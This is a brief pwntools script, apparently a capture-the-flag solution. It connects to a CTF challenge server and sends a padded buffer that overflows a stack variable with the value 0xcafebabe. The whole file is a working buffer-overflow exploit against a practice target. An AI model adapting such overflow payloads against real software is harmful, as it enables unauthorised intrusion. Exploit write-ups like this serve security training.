from pwn import *

r = remote('chall.csivit.com', 30007)
#r = process('./pwn-intended-0x2')
print(r.recvline())
payload = 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE'
payload += '\x00\x00\x00\x00\xbe\xba\xfe\xca' 
#gdb.attach(r)
r.sendline(payload)
print(r.recv())
print(r.recv())
print(r.recv())
